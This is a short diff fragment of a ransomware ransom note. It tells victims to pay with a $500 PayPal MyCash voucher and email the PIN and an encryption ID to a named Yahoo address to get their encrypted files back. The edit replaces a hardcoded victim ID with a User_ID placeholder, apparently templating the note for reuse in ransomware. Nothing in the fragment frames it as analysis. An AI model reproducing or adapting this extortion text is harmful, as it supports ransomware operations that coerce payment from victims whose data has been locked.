@@ -16,7 +16,7 @@ Family Dollar and many other stores.
 After obtaining your PayPal MyCash voucher code you need to send an email to   
 silasw9pa@yahoo.co.uk with the following information.
 1. Your $500 PayPal MyCash PIN
-2. Your encryption ID = USER-PCC4BA-3647
+2. Your encryption ID = User_ID
 Shortly after the voucher is received and verified, all your files will be restored to their previous state.
 All payments are processed and verified manually, do not try to send invalid PIN numbers.
 --------------------------------------------------------------------------------------------------------------------------
